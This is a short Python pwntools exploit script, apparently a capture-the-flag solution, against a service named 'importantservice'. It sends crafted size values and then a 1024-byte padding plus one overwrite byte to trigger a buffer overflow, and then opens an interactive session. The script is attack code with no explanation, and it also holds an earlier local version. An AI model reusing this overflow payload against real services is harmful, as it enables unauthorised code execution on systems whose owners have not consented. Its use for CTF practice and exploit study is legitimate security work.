'''
#!/usr/bin/env python
from pwn import *
 
p = 'A' * 1024 + '\xA9'
r = remote('127.0.0.1', 2323)
r.recvline()
r.sendline('1025 0')
r.recvline()
r.sendline(p)
r.clean()
r.interactive()
'''

from pwn import *

g_local=True
#context.log_level='debug'
#store_idx = 0

if g_local:
	sh = process("./importantservice")#env={'LD_PRELOAD':'./libc.so.6'}
	#gdb.attach(sh)
else:
	sh = remote("importantservice.uni.hctf.fun", 13375)

print util.proc.pidof(sh)							# Print PID so we can attach the debugger.
sys.stdin.read(1)
sh.recvuntil("Please enter width and height e.g.: 5 8\n")
sh.send("1025 0\n")
sh.recvuntil("Please provide some data e.g.: 12345\n")
sh.send("A" * 0x400 + "\xA9")

sh.interactive()
